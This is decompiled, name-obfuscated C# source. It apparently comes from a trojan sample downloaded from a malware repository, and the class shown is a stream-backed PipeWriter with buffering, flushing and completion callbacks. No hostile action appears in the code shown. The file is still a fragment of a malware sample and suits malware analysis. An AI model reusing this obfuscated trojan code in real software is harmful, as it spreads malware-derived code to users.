// Decompiled with JetBrains decompiler
// Type: ao0474769aa563834.i1a063i8u85i4607e
// Assembly: e52a71747iaa0aa11, Version=2.1.0.0, Culture=neutral, PublicKeyToken=cac503e1823ce71c
// MVID: 0D894068-CF68-44D1-88F9-023D8A694267
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan.MSIL.Crypt.gen-32d8b52e3461f3cf3cd3f6811df29ca82987bb597ad104f4ff2e7064dbd625ad.exe

using \u0035o50i023aae3eaa71;
using \u00396u54o009o2511uie;
using Microsoft;
using Microsoft.VisualStudio.Threading;
using System;
using System.Buffers;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipelines;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;

namespace ao0474769aa563834
{
  internal class i1a063i8u85i4607e : PipeWriter
  {
    private readonly object i0iaiau824oe6374o;
    private readonly Stream \u00340870ua47522582i7;
    private readonly \u00383o1ao6a3o902a986<byte> \u00318i3a2a52381o6598;
    private readonly AsyncSemaphore \u0030766196i4u85a666i;
    private List<(Action<Exception, object>, object)> \u0032e394oi2ie055o645;
    private CancellationTokenSource \u0039i875ua3e623424a0;
    private bool \u00337e6u76a00i2083e6;
    private Exception \u003130i68031586e7i04;
    private bool aa82o51709e77a78e;
    private Exception \u003311oeiue38i1ia84o;

    public virtual void ui01oe6u61i7a0io4(int i987609ia8i90198i)
    {
      Verify.Operation(!this.aa82o51709e77a78e, "Writing is already completed.");
      this.\u00318i3a2a52381o6598.Advance(i987609ia8i90198i);
    }

    public virtual void \u00328741o298i9342665() => this.\u0039i875ua3e623424a0?.Cancel();

    public virtual void \u00378948291auo447312(Exception _param1 = null)
    {
      lock (this.i0iaiau824oe6374o)
      {
        if (!this.aa82o51709e77a78e)
        {
          this.aa82o51709e77a78e = true;
          this.\u003311oeiue38i1ia84o = _param1;
        }
      }
      if (this.\u00318i3a2a52381o6598.\u00375ioi381887e70e48.IsEmpty)
      {
        this.\u00318i3a2a52381o6598.Reset();
        this.aea7i475135a1o008();
      }
      else
        this.FlushAsync(new CancellationToken());
    }

    public virtual ValueTask<FlushResult> eie5a8i68086514io(
      CancellationToken ooo520e5509a46535 = default (CancellationToken))
    {
      // ISSUE: variable of a compiler-generated type
      i1a063i8u85i4607e.o61i8a225u96i5ie8 o61i8a225u96i5ie8;
      // ISSUE: reference to a compiler-generated field
      o61i8a225u96i5ie8.\u00317ei875ia19ea4442 = this;
      // ISSUE: reference to a compiler-generated field
      o61i8a225u96i5ie8.\u00364u1io326a070i8uo = ooo520e5509a46535;
      // ISSUE: reference to a compiler-generated field
      o61i8a225u96i5ie8.e58e731361438u6a6 = AsyncValueTaskMethodBuilder<FlushResult>.Create();
      // ISSUE: reference to a compiler-generated field
      o61i8a225u96i5ie8.a74o8ia154u2i1uoa = -1;
      // ISSUE: reference to a compiler-generated field
      o61i8a225u96i5ie8.e58e731361438u6a6.Start<i1a063i8u85i4607e.o61i8a225u96i5ie8>(ref o61i8a225u96i5ie8);
      // ISSUE: reference to a compiler-generated field
      return o61i8a225u96i5ie8.e58e731361438u6a6.Task;
    }

    public virtual Memory<byte> \u0037671o02aieoau5453(int e4a53oi206u19e1ie = 0)
    {
      Verify.Operation(!this.aa82o51709e77a78e, "Writing is already completed.");
      return this.\u00318i3a2a52381o6598.GetMemory(e4a53oi206u19e1ie);
    }

    public virtual Span<byte> \u0038301e770e44335287(int o3o2e06u9413oaaao = 0)
    {
      Verify.Operation(!this.aa82o51709e77a78e, "Writing is already completed.");
      return this.\u00318i3a2a52381o6598.GetSpan(o3o2e06u9413oaaao);
    }

    public virtual void \u0031ieoi16e3uaoia4iu(
      Action<Exception, object> u8043214739o5ai7o,
      object _param2)
    {
      bool flag;
      lock (this.i0iaiau824oe6374o)
      {
        if (this.aa82o51709e77a78e)
        {
          flag = true;
        }
        else
        {
          flag = false;
          if (this.\u0032e394oi2ie055o645 == null)
            this.\u0032e394oi2ie055o645 = new List<(Action<Exception, object>, object)>();
          this.\u0032e394oi2ie055o645.Add((u8043214739o5ai7o, _param2));
        }
      }
      if (!flag)
        return;
      u8043214739o5ai7o(this.\u003311oeiue38i1ia84o, _param2);
    }

    private void aea7i475135a1o008(Exception _param1 = null)
    {
      List<(Action<Exception, object>, object)> valueTupleList = (List<(Action<Exception, object>, object)>) null;
      lock (this.i0iaiau824oe6374o)
      {
        if (!this.\u00337e6u76a00i2083e6)
        {
          this.\u00337e6u76a00i2083e6 = true;
          this.\u003130i68031586e7i04 = _param1;
          valueTupleList = this.\u0032e394oi2ie055o645;
          this.\u0032e394oi2ie055o645 = (List<(Action<Exception, object>, object)>) null;
        }
      }
      if (valueTupleList == null)
        return;
      foreach ((Action<Exception, object>, object) valueTuple in valueTupleList)
      {
        try
        {
          valueTuple.Item1(_param1, valueTuple.Item2);
        }
        catch
        {
        }
      }
    }

    internal i1a063i8u85i4607e(Stream underlyingStream, int minimumBufferSize = 4096)
      : this()
    {
      Requires.NotNull<Stream>(underlyingStream, nameof (underlyingStream));
      Requires.Argument(underlyingStream.CanWrite, nameof (underlyingStream), "Stream must be writable.");
      ((\u00362a5ea26oui79a5a5) this).\u00347911179895o707ia = underlyingStream;
      ((\u00362a5ea26oui79a5a5) this).e1e427ao4e76198ui = ArrayPool<byte>.Shared.Rent(minimumBufferSize);
    }
  }
}
